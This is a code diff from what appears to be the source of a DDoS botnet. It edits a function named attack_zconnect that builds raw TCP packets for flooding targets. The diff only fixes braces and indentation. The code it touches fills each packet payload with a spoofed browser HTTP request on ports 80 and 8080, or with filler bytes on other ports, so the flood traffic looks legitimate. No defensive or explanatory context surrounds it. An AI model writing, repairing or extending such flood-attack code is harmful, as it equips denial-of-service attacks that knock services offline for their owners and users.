@@ -736,15 +736,14 @@ void attack_zconnect(uint8_t targs_len, struct attack_target *targs, uint8_t opt
                     if (dst_port == 80 || dst_port == 8080)
                     {
                         char *http_req = "GET / HTTP/1.1\r\nHost: target\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\nAccept: **\r\nConnection: keep-alive\r\n\r\n";
-                            int http_len = strlen(http_req);
-                            if (http_len > data_len) http_len = data_len;
-                            memcpy(data, http_req, http_len);
-                        }
-                        else
-                        {
-                            for (int k = 0; k < data_len; k++)
-                                data[k] = (k % 94) + 33;
-                        }
+                        int http_len = strlen(http_req);
+                        if (http_len > data_len) http_len = data_len;
+                        memcpy(data, http_req, http_len);
+                    }
+                    else
+                    {
+                        for (int k = 0; k < data_len; k++)
+                            data[k] = (k % 94) + 33;
                     }
                     iph->check = 0;
                     tcph->check = 0;
